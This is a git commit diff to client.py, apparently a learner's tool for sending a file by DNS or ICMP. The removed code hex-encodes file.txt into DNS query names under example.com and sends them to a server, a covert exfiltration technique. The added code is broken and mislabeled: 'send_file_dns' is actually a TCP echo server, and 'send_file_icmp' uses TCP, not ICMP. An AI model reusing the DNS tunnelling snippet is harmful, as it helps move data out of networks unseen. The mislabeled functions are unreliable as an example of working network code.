72865c3c432143d76bc093bfd62af0dbc348e943
Shadowstrikesblu <75082057+Shadowstrikesblu@users.noreply.github.com>
2024-01-05 01:47:04 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,61 +1,61 @@
 import socket
-from scapy.all import DNS, DNSQR, IP, send, UDP
-import binascii
 import os
+from scapy.all import DNS, DNSQR, IP, send, UDP, ICMP
+import binascii
 
 def display_menu():
     print("1. Send a file by DNS ")
-    print("2. Send a file by IMCP ")
+    print("2. Send a file by ICMP ")
     print("3. Exit ")
 
-def file_to_hex(file_path):
-    with open(file_path, 'rb') as file:
-        binary_data = file.read()
-    return binascii.hexlify(binary_data).decode()
+def send_file_dns():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(("127.0.0.1", 12345))
+    server_socket.listen(1)
+    print("Server listening on port 12345...")
+    while True:
+        client_socket, client_address = server_socket.accept()
+        print(f"Connection established with {client_address}")
+        data = client_socket.recv(1024)
+        if not data:
+            break
+        message = data.decode()
+        print(f"Received from client: {message}")
+ 
+        client_socket.sendall(data)
+        client_socket.close()
+    server_socket.close()
 
-def send_file_dns(server_ip, file_path):
-    hex_data = file_to_hex(file_path)
 
-    # Encode the file data into a domain name
-    domain = hex_data + '.example.com'
-
-    # Create a DNS query with the domain name
-    packet = IP(dst=server_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
-
-    # Send the packet
-    send(packet)
-
-def send_file_imcp():
+def send_file_icmp():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("127.0.0.1", 12345)) #if the clients/server are on different network you shall bind to ('', port)
-
-    s.listen(10)
+    s.bind(("192.168.1.122", 12343))
+    s.listen(1)
     c, addr = s.accept()
     print('{} connected.'.format(addr))
 
-    f = open("file.txt", "rb")
-    l = os.path.getsize("file.txt")
-    m = f.read(l)
-    c.sendall(m)
-    f.close()
-    print("Terminé...")
-
+    with open("file.txt", "rb") as f:
+        m = f.read()
+        print(m)
+        c.sendall(m)
+    print("Done sending...")
+    c.close()  
+    s.close()  
 
 def main():
     while True:
         display_menu()
         choice = input("Enter your choice: ")
         if choice == "1":
-            server_ip = input("Enter server IP: ")
-            send_file_dns(server_ip, 'file.txt')
+            send_file_dns()
+            break
         elif choice == "2":
-            # server_ip = input("Enter server IP: ")
-            # send_file_imcp('', 'file.txt')
-            send_file_imcp()
+            send_file_icmp()
+            break
         elif choice == "3":
             print("Exit")
             break
         else:
-            print("Invalid choice")        
+            print("Invalid choice")
 
 main()
